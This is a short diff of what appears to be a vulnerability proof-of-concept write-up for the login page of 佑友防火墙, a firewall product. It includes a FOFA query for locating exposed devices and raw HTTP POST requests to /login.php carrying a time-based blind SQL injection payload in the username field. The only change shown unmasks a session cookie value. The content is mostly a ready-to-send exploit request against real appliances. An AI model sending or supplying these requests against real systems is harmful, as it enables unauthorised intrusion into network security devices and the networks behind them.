@@ -73,7 +73,7 @@ fofa：title="佑友防火墙"
 ```plain
 POST /login.php HTTP/1.1
 Host: 
-Cookie: PHPSESSID=qc1********************de1
+Cookie: PHPSESSID=qc13eucchtnbr161lnca4ibde1
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -89,7 +89,7 @@ action=login&username=dadsa' AND (SELECT 6357 FROM (SELECT(SLEEP(5)))DIFt) AND '
 ```plain
 POST /login.php HTTP/1.1
 Host: 
-Cookie: PHPSESSID=qc1********************de1
+Cookie: PHPSESSID=qc13eucchtnbr161lnca4ibde1
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
